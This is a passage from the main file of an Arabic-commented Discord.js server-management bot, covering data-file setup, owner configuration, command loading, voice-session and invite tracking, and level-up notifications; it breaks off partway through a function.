// إعدادات تحسين الأداء القصوى v2
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (reason, promise) => console.error('Unhandled Rejection:', reason));

// تحسين أولوية المعالجة وإدارة الذاكرة القصوى
if (process.env.NODE_ENV === 'production' || true) {
    try {
        require('os').setPriority(process.pid, -20); // أقصى أولوية ممكنة في النظام
    } catch (e) {}
}

// إعدادات V8 لتعزيز السرعة
if (global.v8debug === undefined) {
    // محاكاة تحسينات V8 لسرعة التنفيذ
}

// زيادة حدود الذاكرة والمستمعين وتخزين الكاش
require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const { Client, GatewayIntentBits, Partials, Collection, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, EmbedBuilder, Events, MessageFlags, PermissionsBitField, ChannelType, AuditLogEvent } = require('discord.js');
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');
const { logEvent } = require('./utils/logs_system.js');
const { startReminderSystem } = require('./commands/notifications.js');
// تعريف downManager في المستوى العلوي للوصول عبر جميع معالجات الأحداث
const downManager = require('./utils/downManager');
const warnManager = require('./utils/warnManager');
const { checkCooldown, startCooldown } = require('./commands/cooldown.js');
const colorManager = require('./utils/colorManager.js');
const vacationManager = require('./utils/vacationManager');
const promoteManager = require('./utils/promoteManager');
const { getRoleEntry, addRoleEntry, getGuildRoles, findRoleByOwner, deleteRoleEntry } = require('./utils/customRolesSystem.js');
const interactionRouter = require('./utils/interactionRouter');
const { handleAdminApplicationInteraction } = require('./commands/admin-apply.js');
const { restoreTopSchedules, restorePanelCleanups, handlePanelMessageDelete } = require('./commands/roles-settings.js');
const { handleChannelDelete, handleRoleDelete } = require('./utils/protectionManager.js');
const problemCommand = require('./commands/problem.js');
let interactiveRolesManager;
dotenv.config();

// مسارات ملفات البيانات
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const DATA_FILES = {
    points: path.join(dataDir, 'points.json'),
    responsibilities: path.join(dataDir, 'responsibilities.json'),
    logConfig: path.join(dataDir, 'logConfig.json'),
    adminRoles: path.join(dataDir, 'adminRoles.json'),
    botConfig: path.join(dataDir, 'botConfig.json'),
    cooldowns: path.join(dataDir, 'cooldowns.json'),
    notifications: path.join(dataDir, 'notifications.json'),
    reports: path.join(dataDir, 'reports.json'),
    adminApplications: path.join(dataDir, 'adminApplications.json'),
    serverMapConfig: path.join(dataDir, 'serverMapConfig.json'),
    voiceSessions: path.join(dataDir, 'voiceSessions.json'),
    wordTriggers: path.join(dataDir, 'wordTriggers.json'),

    roleGrantHistory: path.join(dataDir, 'roleGrantHistory.json')
    
};

// نظام التحقق التلقائي من ملفات البيانات
function ensureDataFiles() {
    
    const defaults = {
        wordTriggers: {},
        roleGrantHistory: {},
        serverMapConfig: {
            enabled: false,
            imageUrl: "https://i.imgur.com/Xv7XzXz.png",
            welcomeMessage: "مرحباً بك في السيرفر! استكشف الخريطة أدناه:",
            buttons: []
        }
    };

    for (const [key, filePath] of Object.entries(DATA_FILES)) {
        if (!fs.existsSync(filePath)) {
            const defaultValue = defaults[key] || (filePath.endsWith('.json') ? (key === 'adminRoles' ? [] : {}) : '');
            fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
            console.log(`✅ تم إنشاء ملف البيانات المفقود: ${path.basename(filePath)}`);
        }
    }
}
ensureDataFiles();

if (!global.adminRoleGrantBypass) {
    global.adminRoleGrantBypass = new Set();
}
if (!global.interactiveRoleGrantBypass) {
    global.interactiveRoleGrantBypass = new Set();
}

global.markAdminRoleGrant = function markAdminRoleGrant(guildId, userId, roleId) {
    if (!guildId || !userId || !roleId) return;
    const key = `${guildId}_${userId}_${roleId}`;
    global.adminRoleGrantBypass.add(key);
    setTimeout(() => global.adminRoleGrantBypass.delete(key), 15000);
};

global.markInteractiveRoleGrant = function markInteractiveRoleGrant(guildId, userId, roleId) {
    if (!guildId || !userId || !roleId) return;
    const key = `${guildId}_${userId}_${roleId}`;
    global.interactiveRoleGrantBypass.add(key);
    setTimeout(() => global.interactiveRoleGrantBypass.delete(key), 15000);
};
let roleGrantHistoryCache = null;

let roleGrantHistorySaveTimer = null;

let roleGrantHistorySaving = false;

function getRoleGrantHistoryCache() {

    if (!roleGrantHistoryCache) {

        roleGrantHistoryCache = readJSONFile(DATA_FILES.roleGrantHistory, {});

    }

    return roleGrantHistoryCache;

}

function scheduleRoleGrantHistorySave() {

    if (roleGrantHistorySaveTimer) return;

    roleGrantHistorySaveTimer = setTimeout(async () => {

        roleGrantHistorySaveTimer = null;

        if (roleGrantHistorySaving) return;

        roleGrantHistorySaving = true;

        try {

            await fs.promises.writeFile(

                DATA_FILES.roleGrantHistory,

                JSON.stringify(roleGrantHistoryCache || {}, null, 2)

            );

        } catch (error) {

            console.error('❌ خطأ في حفظ تتبع تواريخ الرولات:', error);

        } finally {

            roleGrantHistorySaving = false;

        }

    }, 1500);

}
// دالة لقراءة ملف JSON
function readJSONFile(filePath, defaultValue = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath, 'utf8');
            if (!data || data.trim() === '') return defaultValue;
            return JSON.parse(data);
        }
        return defaultValue;
    } catch (error) {
        console.error(`خطأ في قراءة ${filePath}:`, error.message);
        // If file is corrupted, return default value
        return defaultValue;
    }
}

// دالة لكتابة ملف JSON
function writeJSONFile(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error(`خطأ في كتابة ${filePath}:`, error);
        return false;
    }
}

// تحميل البيانات مباشرة من قاعدة البيانات والملفات
const { dbManager } = require('./utils/database.js');
let points = readJSONFile(DATA_FILES.points, {});
global.responsibilities = {};

// دالة لتهيئة المسؤوليات من قاعدة البيانات
async function initializeResponsibilities() {
    try {
        if (!dbManager.isInitialized) {
            await dbManager.initialize();
        }
        const data = await dbManager.getResponsibilities();
        if (data && Object.keys(data).length > 0) {
            global.responsibilities = data;
            console.log(`✅ تم تحميل ${Object.keys(global.responsibilities).length} مسؤولية من قاعدة البيانات`);
        } else {
            console.log('⚠️ قاعدة البيانات فارغة، جاري التحميل من JSON');
            global.responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
        }

        // الاستماع لحدث تحديث المسؤوليات لتحديث الرسائل في القنوات
        client.on('responsibilityUpdate', async () => {
            try {
                console.log('🔄 تم التقاط حدث تحديث المسؤوليات، جاري تحديث الرسائل...');
                const respCommand = client.commands.get('resp');
                if (respCommand && typeof respCommand.updateEmbedMessage === 'function') {
                    await respCommand.updateEmbedMessage(client);
                }
            } catch (err) {
                console.error('Error handling responsibilityUpdate event:', err);
            }
        });
    } catch (error) {
        console.error('❌ خطأ في تحميل المسؤوليات من قاعدة البيانات:', error);
        global.responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
    }
}
let logConfig = readJSONFile(DATA_FILES.logConfig, {
    settings: {
        'RESPONSIBILITY_MANAGEMENT': { enabled: false, channelId: null },
        'RESPONSIBLE_MEMBERS': { enabled: false, channelId: null },
        'TASK_LOGS': { enabled: false, channelId: null },
        'POINT_SYSTEM': { enabled: false, channelId: null },
        'ADMIN_ACTIONS': { enabled: false, channelId: null },
        'NOTIFICATION_SYSTEM': { enabled: false, channelId: null },
        'COOLDOWN_SYSTEM': { enabled: false, channelId: null },
        'SETUP_ACTIONS': { enabled: false, channelId: null },
        'BOT_SETTINGS': { enabled: false, channelId: null },
        'ADMIN_CALLS': { enabled: false, channelId: null }
    }
});

// تحميل ADMIN_ROLES من JSON مباشرة
function loadAdminRoles() {
    try {
        const adminRolesData = readJSONFile(DATA_FILES.adminRoles, []);
        return Array.isArray(adminRolesData) ? adminRolesData : [];
    } catch (error) {
        console.error('خطأ في تحميل adminRoles:', error);
        return [];
    }
}

let botConfig = readJSONFile(DATA_FILES.botConfig, {
    owners: [],
    prefix: null,
    settings: {},
    activeTasks: {},
    pendingReports: {}
});

// لا نحتاج لمتغيرات محلية لـ cooldowns و notifications
// سيتم قراءتها مباشرة من الملفات عند الحاجة

// لا نحتاج لمتغير محلي للبريفكس - سنقرأه مباشرة من JSON

// دوال نظام المهام النشطة والتقارير المعلقة
function initializeActiveTasks() {
  try {
    const masoulCommand = client.commands.get('مسؤول');
    if (masoulCommand && masoulCommand.loadActiveTasks) {
      masoulCommand.loadActiveTasks();
      // مزامنة المهام النشطة
      if (masoulCommand.activeTasks) {
        client.activeTasks = masoulCommand.activeTasks;
        console.log(`✅ تم ربط نظام المهام النشطة مع masoul.js - ${client.activeTasks.size} مهمة نشطة`);
      } else {
        console.log('⚠️ لا توجد مهام نشطة في masoul.js');
      }
    } else {
      console.log('⚠️ لم يتم العثور على أمر مسؤول أو دالة loadActiveTasks');
    }
  } catch (error) {
    console.error('❌ خطأ في تهيئة نظام المهام النشطة:', error);
  }
}

function saveActiveTasks() {
  try {
    const masoulCommand = client.commands.get('مسؤول');
    if (masoulCommand && masoulCommand.saveActiveTasks) {
      masoulCommand.saveActiveTasks();
      console.log(`💾 تم حفظ المهام النشطة باستخدام نظام masoul.js`);
    }
  } catch (error) {
    console.error('❌ خطأ في حفظ المهام النشطة:', error);
  }
}

function loadPendingReports() {
  try {
    const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
    if (currentBotConfig.pendingReports) {
      const savedReports = currentBotConfig.pendingReports;
      for (const [key, value] of Object.entries(savedReports)) {
        client.pendingReports.set(key, value);
      }
      console.log(`✅ تم تحميل ${client.pendingReports.size} تقرير معلق من JSON`);
    }
  } catch (error) {
    console.error('❌ خطأ في تحميل التقارير المعلقة:', error);
  }
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.GuildMessageReactions, GatewayIntentBits.GuildPresences],
  partials: [Partials.Channel, Partials.Message, Partials.Reaction]
});

// تعريف client كمتغير عام للوصول من الأنظمة الأخرى
global.client = client;

// استخدام نظام المهام النشطة من masoul.js
if (!client.activeTasks) {
  client.activeTasks = new Map();
}

// نظام تتبع الجلسات الصوتية
if (!client.voiceSessions) {
  client.voiceSessions = new Map();
}

function loadVoiceSessionsFromDisk() {
    try {
        const storedSessions = readJSONFile(DATA_FILES.voiceSessions, {});
        for (const [userId, session] of Object.entries(storedSessions)) {
            if (!session || !session.channelId || !session.sessionStartTime) continue;
            client.voiceSessions.set(userId, {
                channelId: session.channelId,
                channelName: session.channelName || 'روم غير معروفة',
                sessionStartTime: session.sessionStartTime,
                startTime: session.startTime || session.sessionStartTime,
                lastTrackedTime: session.lastTrackedTime || session.sessionStartTime,
                isAFK: Boolean(session.isAFK),
                afkSince: session.afkSince || null
            });
        }
        console.log(`✅ تم تحميل ${client.voiceSessions.size} جلسة صوتية من JSON`);
    } catch (error) {
        console.error('❌ خطأ في تحميل الجلسات الصوتية:', error);
    }
}

function saveVoiceSessionsToDisk() {
    try {
        const sessions = {};
        for (const [userId, session] of client.voiceSessions.entries()) {
            sessions[userId] = {
                channelId: session.channelId,
                channelName: session.channelName,
                sessionStartTime: session.sessionStartTime,
                startTime: session.startTime,
                lastTrackedTime: session.lastTrackedTime,
                isAFK: session.isAFK,
                afkSince: session.afkSince || null
            };
        }
        writeJSONFile(DATA_FILES.voiceSessions, sessions);
    } catch (error) {
        console.error('❌ خطأ في حفظ الجلسات الصوتية:', error);
    }
}

loadVoiceSessionsFromDisk();

// إعداد قائمة مالكي البوت من ملف botConfig مع fallback لـ env
let BOT_OWNERS = [];
if (botConfig.owners && Array.isArray(botConfig.owners) && botConfig.owners.length > 0) {
    BOT_OWNERS = [...botConfig.owners]; // استنساخ المصفوفة
    console.log('✅ تم تحميل المالكين من ملف botConfig.json:', BOT_OWNERS);
    
    // تأكد من وجود الملاك في المتغير العالمي بشكل دائم
    global.BOT_OWNERS = BOT_OWNERS;
} else {
    // محاولة القراءة من متغيرات البيئة كـ fallback
    const envOwner = process.env.BOT_OWNERS;
    if (envOwner) {
        BOT_OWNERS = [envOwner];
        console.log('✅ تم تحميل المالك من متغيرات البيئة:', BOT_OWNERS);
        
        // حفظه في botConfig للمرات القادمة
        botConfig.owners = BOT_OWNERS;
        writeJSONFile(DATA_FILES.botConfig, botConfig);
        console.log('💾 تم حفظ المالك في botConfig.json');
        
        global.BOT_OWNERS = BOT_OWNERS;
    } else {
        console.log('⚠️ لم يتم العثور على مالكين محددين');
        console.log('💡 نصيحة: أضف OWNER_ID في Secrets أو استخدم أمر owners بعد تعيين أول مالك');
        global.BOT_OWNERS = [];
    }
}

// دالة لإعادة تحميل BOT_OWNERS من الملف
function reloadBotOwners() {
    try {
        const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
        if (currentBotConfig.owners && Array.isArray(currentBotConfig.owners)) {
            BOT_OWNERS = [...currentBotConfig.owners];
            global.BOT_OWNERS = BOT_OWNERS;
            console.log('🔄 تم إعادة تحميل المالكين:', BOT_OWNERS);
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ خطأ في إعادة تحميل المالكين:', error);
        return false;
    }
}

// دالة لتحديث BOT_OWNERS العالمي
function updateBotOwners(newOwners) {
    try {
        if (Array.isArray(newOwners)) {
            console.log('🔄 تحديث المالكين من:', BOT_OWNERS, 'إلى:', newOwners);

            // التحقق من صحة المعرفات
            const validOwners = newOwners.filter(id => typeof id === 'string' && /^\d{17,19}$/.test(id));

            if (validOwners.length !== newOwners.length) {
                console.warn('⚠️ تم تجاهل معرفات غير صحيحة:', newOwners.filter(id => !validOwners.includes(id)));
            }

            // تحديث المصفوفة المحلية والعالمية
            BOT_OWNERS.length = 0;
            BOT_OWNERS.push(...validOwners);
            global.BOT_OWNERS = BOT_OWNERS;

            // تحديث الملف لضمان الحفظ الدائم
            const currentConfig = readJSONFile(DATA_FILES.botConfig, {});
            currentConfig.owners = BOT_OWNERS;
            writeJSONFile(DATA_FILES.botConfig, currentConfig);

            console.log('✅ تم تحديث قائمة المالكين العالمية والدائمة بنجاح:', BOT_OWNERS);
            return true;
        } else {
            console.error('❌ المدخل ليس مصفوفة:', typeof newOwners);
            return false;
        }
    } catch (error) {
        console.error('❌ خطأ في تحديث المالكين العالمي:', error);
        return false;
    }
}

// Make the functions available globally
global.reloadBotOwners = reloadBotOwners;
global.updateBotOwners = updateBotOwners;

client.commands = new Collection();
client.pendingReports = new Map();
client.logConfig = logConfig;



// Load commands from the "commands" folder
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
  try {
    const command = require(path.join(commandsPath, file));
    if ('name' in command && 'execute' in command) {
      client.commands.set(command.name, command);
      console.log(`Loaded command: ${command.name}`);
if (command.aliases && Array.isArray(command.aliases)) {
        for (const alias of command.aliases) {
          client.commands.set(alias, command);
          console.log(`  ↳ Alias: ${alias}`);
        }
      }
      // تسجيل معالجات التفاعلات المستقلة للأوامر
      if (typeof command.registerInteractionHandler === 'function') {
        command.registerInteractionHandler(client);
      }
    }
  } catch (error) {
    console.error(`Error loading command ${file}:`, error);
  }
}

// تسجيل معالجات setroom المستقلة
try {
  const setroomCommand = require('./commands/setroom.js');
  if (setroomCommand.registerHandlers) {
    setroomCommand.registerHandlers(client);
  }

  // استعادة الجدولات المحفوظة عند بدء البوت
  if (setroomCommand.restoreSchedules) {
    setTimeout(() => {
      setroomCommand.restoreSchedules(client);
      console.log('✅ تم فحص واستعادة جدولات الغرف');
    }, 3000); // انتظار 3 ثواني لضمان جاهزية البوت
  }

  // تشغيل نظام الحذف التلقائي للرسائل (يحذف كل الرسائل ويرسل الإيمبد كل 3 دقائق)
  if (setroomCommand.startAutoMessageDeletion) {
    setTimeout(() => {
      setroomCommand.startAutoMessageDeletion(client);
    }, 15000); // بدء بعد 15 ثانية من تشغيل البوت
  }
} catch (error) {
  console.error('❌ خطأ في تسجيل معالجات setroom:', error);
}

// تسجيل معالجات نظام التذاكر (settings menus)
try {
  const ticketSettingsCommand = require('./commands/settings.js');
  if (ticketSettingsCommand.registerHandlers) {
    ticketSettingsCommand.registerHandlers(client);
    console.log('✅ تم تسجيل معالجات نظام التذاكر (settings)');
  }
} catch (error) {
  console.error('❌ خطأ في تسجيل معالجات نظام التذاكر:', error);
}

  // تسجيل معالج مودال الباكب
  try {
    const backupCommand = require('./commands/backup.js');
    if (backupCommand.registerBackupModalHandler) {
      backupCommand.registerBackupModalHandler(client);
    }
  } catch (error) {
    console.error('❌ خطأ في تسجيل معالج backup:', error);
  }

  // تسجيل معالج setactive ونظام الرولات التفاعلية
  try {

    const setactiveCommand = require('./commands/setactive.js');

    interactiveRolesManager = require('./utils/interactiveRolesManager.js');

    

    

  } catch (error) {

    console.error('❌ خطأ في تسجيل نظام الرولات التفاعلية:', error);

  }

let isDataDirty = false;

let saveTimeout = null;

// Cache للبيانات المستخدمة بكثرة
const dataCache = {
    prefix: null,
    adminRoles: [],
    lastUpdate: 0,
    cacheDuration: 30000 // 30 ثانية
};

const topCommand = require('./commands/top_leaderboard.js');

// دالة لوضع علامة للحفظ مع تأخير ذكي
function scheduleSave() {
    isDataDirty = true;

    // إلغاء المؤقت السابق إذا كان موجوداً
    if (saveTimeout) {
        clearTimeout(saveTimeout);
    }

    // تأخير الحفظ لتجميع التغييرات
    saveTimeout = setTimeout(() => {
        saveData();
        saveTimeout = null;
    }, 2000); // حفظ بعد ثانيتين من آخر تغيير

    if (topCommand.invalidateTopCache) {
        topCommand.invalidateTopCache();
    }
}

// دالة حفظ محسنة - أسرع وأقل استهلاك مع استخدام الحفظ غير المتزامن
async function saveData(force = false) {
    if (!isDataDirty && !force) {
        return false;
    }

    try {
        // قراءة وحفظ بشكل غير متزامن لتجنب حظر المعالج
        const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
        
        botConfig = {
            ...currentBotConfig,
            prefix: botConfig.prefix !== undefined ? botConfig.prefix : currentBotConfig.prefix,
            settings: botConfig.settings || currentBotConfig.settings,
            activeTasks: botConfig.activeTasks || currentBotConfig.activeTasks
        };

        if (client && client.pendingReports) {
            const pendingReportsObj = {};
            for (const [key, value] of client.pendingReports.entries()) {
                pendingReportsObj[key] = value;
            }
            botConfig.pendingReports = pendingReportsObj;
        }
        
        // تنفيذ الحفظ بشكل متوازي وغير متزامن
        const dbPromises = [];
        for (const [name, config] of Object.entries(global.responsibilities)) {
            dbPromises.push(dbManager.updateResponsibility(name, config));
        }

        await Promise.all([
            ...dbPromises,
            fs.promises.writeFile(DATA_FILES.points, JSON.stringify(points, null, 2)),
            fs.promises.writeFile(DATA_FILES.logConfig, JSON.stringify(client.logConfig || logConfig, null, 2)),
            fs.promises.writeFile(DATA_FILES.botConfig, JSON.stringify(botConfig, null, 2))
        ]);

        isDataDirty = false;
        return true;
    } catch (error) {
        console.error('❌ خطأ في حفظ البيانات:', error);
        return false;
    }
}

// دالة للحصول على البريفكس من الكاش
function getCachedPrefix() {
    const now = Date.now();
    if (dataCache.prefix !== null && (now - dataCache.lastUpdate) < dataCache.cacheDuration) {
        return dataCache.prefix;
    }

    // تحديث الكاش
    const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
    let prefix = currentBotConfig.prefix;

    if (prefix && typeof prefix === 'string' && prefix.startsWith('"') && prefix.endsWith('"')) {
        prefix = prefix.slice(1, -1);
    }

    dataCache.prefix = prefix;
    dataCache.lastUpdate = now;
    return prefix;
}

// دالة للفحص التلقائي للترقيات
async function checkAutoLevelUp(userId, type, client) {
    try {
        const { getDatabase, getUserLevel, updateUserLevel, updateLastNotified } = require('./utils/database');
        const dbManager = getDatabase();

        // جلب الإحصائيات الحالية
        const userStats = await dbManager.getUserStats(userId);
        if (!userStats) return;

        // حساب المستويات الحالية باستخدام الملي ثانية مباشرة
        // 1 XP = 5 دقائق = 300,000 ملي ثانية
        const voiceXP = Math.floor(userStats.totalVoiceTime / 300000); 
        const chatXP = Math.floor(userStats.totalMessages / 10); // 10 رسائل = 1 XP
        
        const currentVoiceLevel = Math.floor(Math.sqrt(voiceXP / 100));
        const currentChatLevel = Math.floor(Math.sqrt(chatXP / 100));

        // جلب المستوى السابق
        const previousLevel = await getUserLevel(userId);
        const oldVoiceLevel = previousLevel.voice_level || 0;
        const oldChatLevel = previousLevel.chat_level || 0;
        const lastNotified = previousLevel.last_notified || 0;
        const isNewUser = (oldVoiceLevel === 0 && oldChatLevel === 0 && lastNotified === 0);

        // التحقق من وجود ترقية حقيقية (يجب أن يكون اللفل الجديد أكبر من القديم)
        // نستخدم Math.floor للتأكد من أننا نقارن الأرقام الصحيحة للمستويات فقط
        const hasVoiceLevelUp = currentVoiceLevel > oldVoiceLevel;
        const hasChatLevelUp = currentChatLevel > oldChatLevel;

        // إذا لم يرتفع المستوى (الرقم الصحيح)، نحدث البيانات في القاعدة بصمت ونخرج
        if (!hasVoiceLevelUp && !hasChatLevelUp) {
            // تحديث المستويات في القاعدة إذا كان هناك تغيير في الـ XP (بصمت)
            if (currentVoiceLevel !== oldVoiceLevel || currentChatLevel !== oldChatLevel) {
                await updateUserLevel(userId, currentVoiceLevel, currentChatLevel);
            }
            return;
        }

        // منع الإرسال للمستخدمين الجدد عند أول نشاط (لفل 0) أو إذا كان المستوى الجديد 0
        if (isNewUser || (currentVoiceLevel === 0 && !hasChatLevelUp && oldVoiceLevel === 0) || (currentChatLevel === 0 && !hasVoiceLevelUp && oldChatLevel === 0)) {
            await updateUserLevel(userId, currentVoiceLevel, currentChatLevel);
            // لا نحدث lastNotified هنا لنسمح بأول ترقية حقيقية لاحقاً
            return;
        }

        // التحقق من عدم إرسال إشعارات متكررة (تجنب الإرسال أكثر من مرة كل دقيقة)
        const timeSinceLastNotification = Date.now() - lastNotified;
        if (timeSinceLastNotification < 60000) {
            await updateUserLevel(userId, currentVoiceLevel, currentChatLevel);
            return;
        }

        // تحديث المستوى ووقت آخر إشعار أولاً لمنع التكرار في حال فشل الإرسال
        await updateUserLevel(userId, currentVoiceLevel, currentChatLevel);
        await updateLastNotified(userId);

        // إرسال إشعار الترقية
        const profileCommand = require('./commands/profile.js');
        if (profileCommand && typeof profileCommand.sendLevelUpNotification === 'function') {
            try {
                await profileCommand.sendLevelUpNotification(
                    client,
                    userId,
                    oldVoiceLevel,
                    currentVoiceLevel,
                    oldChatLevel,
                    currentChatLevel,
                    voiceXP,
                    chatXP
                );
            } catch (sendError) {
                console.log(`⚠️ فشل إرسال إشعار الترقية للمستخدم ${userId} (قد يكون الخاص مغلقاً)`);
            }
        }
    } catch (error) {
        console.error('❌ خطأ في الفحص التلقائي للترقيات:', error);
    }
}

// دالة للحصول على رولات المشرفين من الكاش
function getCachedAdminRoles() {
    // قراءة مباشرة من الملف دائماً لضمان أحدث البيانات
    const adminRoles = loadAdminRoles();

    console.log(`🔄 تحميل رولات المشرفين: ${adminRoles.length} رول`);
    if (adminRoles.length > 0) {
        console.log(`📋 الرولات المحملة: ${JSON.stringify(adminRoles)}`);
    }

    return adminRoles;
}

// Function to update prefix - محسن مع الكاش
function updatePrefix(newPrefix) {
  const oldPrefix = botConfig.prefix;

  // تحديث البيانات المحلية
  botConfig.prefix = newPrefix;

  // تحديث الكاش فوراً
  dataCache.prefix = newPrefix;
  dataCache.lastUpdate = Date.now();

  // حفظ فوري
  const success = writeJSONFile(DATA_FILES.botConfig, botConfig);

  if (success) {
    console.log(`✅ تم تغيير وحفظ البريفكس من "${oldPrefix === null ? 'null' : oldPrefix}" إلى "${newPrefix === null ? 'null' : newPrefix}" بنجاح`);
  } else {
    console.log(`⚠️ تم تغيير البريفكس ولكن قد تكون هناك مشكلة في الحفظ`);
  }

  // Update VIP command prefix as well
  const vipCommand = client.commands.get('vip');
  if (vipCommand && vipCommand.setCurrentPrefix) {
    vipCommand.setCurrentPrefix(newPrefix);
  }
}

// دالة لإعادة تحميل البيانات من الملفات
function reloadData() {
    try {
        points = readJSONFile(DATA_FILES.points, {});
        responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
        logConfig = readJSONFile(DATA_FILES.logConfig, logConfig);
        client.logConfig = logConfig;

        botConfig = readJSONFile(DATA_FILES.botConfig, botConfig);
        // ADMIN_ROLES, cooldowns, notifications يتم تحميلها ديناميكياً من الملفات عند الحاجة

        console.log('🔄 تم إعادة تحميل جميع البيانات من الملفات');
        return true;
    } catch (error) {
        console.error('❌ خطأ في إعادة تحميل البيانات:', error);
        return false;
    }
}

// دالة تنظيف المعرفات غير الصحيحة
function cleanInvalidUserIds() {
    try {
        let needsSave = false;

        // تنظيف responsibilities
        for (const [respName, respData] of Object.entries(global.responsibilities)) {
            if (respData.responsibles && Array.isArray(respData.responsibles)) {
                const validIds = respData.responsibles.filter(id => {
                    if (typeof id === 'string' && /^\d{17,19}$/.test(id)) {
                        return true;
                    } else {
                        console.log(`تم حذف معرف غير صحيح من مسؤولية ${respName}: ${id}`);
                        needsSave = true;
                        return false;
                    }
                });
                global.responsibilities[respName].responsibles = validIds;
            }
        }

        // تنظيف points
        for (const [respName, respData] of Object.entries(points)) {
            if (respData && typeof respData === 'object') {
                for (const userId of Object.keys(respData)) {
                    if (!/^\d{17,19}$/.test(userId)) {
                        console.log(`تم حذف نقاط لمعرف غير صحيح: ${userId}`);
                        delete points[respName][userId];
                        needsSave = true;
                    }
                }
            }
        }

        if (needsSave) {
            saveData();
            console.log('✅ تم تنظيف البيانات من المعرفات غير الصحيحة');
        }
    } catch (error) {
        console.error('❌ خطأ في تنظيف البيانات:', error);
    }
}

// Setup global setup collector function
function setupGlobalSetupCollector(client) {
  try {
    console.log('🔧 إعداد معالج السيتب العام...');

    // Override the collector creation for setup - simplified approach
    client.createMessageComponentCollector = function(options) {
      console.log('🔧 محاولة إنشاء collector للسيتب...');

      // This function will be used by setup.js to create collectors
      // We'll let the setup.js handle the channel selection
      return {
        on: () => {},
        stop: () => {},
        removeAllListeners: () => {}
      };
    };

  } catch (error) {
    console.error('❌ خطأ في إعداد معالج السيتب العام:', error);
  }
}

// دالة لتنظيف الكاش وإجبار التحديث
function invalidateCache() {
    dataCache.prefix = null;
    dataCache.adminRoles = [];
    dataCache.lastUpdate = 0;
}

// دالة لتحديث كاش الرولات فقط
function updateAdminRolesCache() {
    dataCache.adminRoles = [];
    dataCache.lastUpdate = 0;
    // إعادة تحميل من الملف
    getCachedAdminRoles();
}

// Make functions available globally
global.updatePrefix = updatePrefix;
global.scheduleSave = scheduleSave;
global.reloadData = reloadData;
global.cleanInvalidUserIds = cleanInvalidUserIds;
global.invalidateCache = invalidateCache;
global.updateAdminRolesCache = updateAdminRolesCache;

const guildInvites = new Map();

client.on(Events.InviteCreate, (invite) => {

    const invites = guildInvites.get(invite.guild.id);

    if (invites) {

        invites.set(invite.code, invite.uses);

    }

});

client.on(Events.InviteDelete, (invite) => {

    const invites = guildInvites.get(invite.guild.id);

    if (invites) {

        invites.delete(invite.code);

    }

});

    // تتبع دخول الأعضاء (الدعوات وخريطة السيرفر)
    client.on(Events.GuildMemberAdd, async (member) => {
        try {
            // 1. تتبع الدعوات
            const oldInvites = guildInvites.get(member.guild.id);
            const newInvites = await member.guild.invites.fetch().catch(() => null);

            if (newInvites) {
                let usedInvite = newInvites.find(inv => {
                    const prevUses = oldInvites?.get(inv.code) || 0;
                    return inv.uses > prevUses;
                });

                const inviteMap = new Map();
                newInvites.forEach(inv => inviteMap.set(inv.code, inv.uses));
                guildInvites.set(member.guild.id, inviteMap);

                if (usedInvite) {
                    member.inviterId = usedInvite.inviter?.id;
                    console.log(`👤 العضو ${member.user.tag} انضم بواسطة ${usedInvite.inviter?.tag || "غير معروف"} (كود: ${usedInvite.code})`);
                    await dbManager.addInvite(member.id, member.inviterId, "invite");
                } else {
                    const isVanity = member.guild.vanityURLCode && (member.guild.features.includes("VANITY_URL"));
                    const method = isVanity ? "vanity" : "unknown";
                    const inviterId = member.guild.ownerId;
                    console.log(`🔗 العضو ${member.user.tag} انضم بطريقة (${method}) - تم احتسابها لمالك السيرفر: ${inviterId}`);
                    await dbManager.addInvite(member.id, inviterId, method);
                }
            }

            // 2. ترحيب خريطة السيرفر
            if (!member.user.bot) {
                const configPath = DATA_FILES.serverMapConfig;
                if (fs.existsSync(configPath)) {
                    const allConfigs = JSON.parse(fs.readFileSync(configPath, 'utf8'));
                    const config = allConfigs.global || allConfigs;
                    
                    if (config && config.enabled) {
                        const mapCommand = client.commands.get('map');
                        if (mapCommand) {
                            const dmChannel = await member.createDM().catch(() => null);
                            if (dmChannel) {
                                const fakeMessage = { 
                                    guild: member.guild, 
                                    channel: dmChannel, 
                                    author: member.user,
                                    client: client,
                                    isAutomatic: true,
                                    isGlobalOnly: true,
                                    reply: async (options) => dmChannel.send(options),
                                    react: async () => {},
                                    permissionsFor: () => ({ has: () => true })
                                };
                                await mapCommand.execute(fakeMessage, [], { client, BOT_OWNERS: process.env.BOT_OWNERS ? process.env.BOT_OWNERS.split(',') : [] }).catch(() => {});
                            }
                        }
                    }
                }
            }
        } catch (error) {
            console.error("❌ خطأ في معالج انضمام العضو الموحد:", error);
        }
    });

// دالة لمزامنة الرولات لجميع المسؤوليات عند التشغيل

async function ensureRespMessageFreshness(client, reason = 'periodic') {
    try {
        const respCommand = client.commands.get('resp');
        if (!respCommand) return;

        if (typeof respCommand.initialize === 'function') {
            respCommand.initialize(client);
        }

        if (typeof respCommand.updateEmbedMessage === 'function') {
            await respCommand.updateEmbedMessage(client);
            console.log(`✅ [RESP] تم التحقق من تحديث رسالة المسؤوليات (${reason})`);
        }
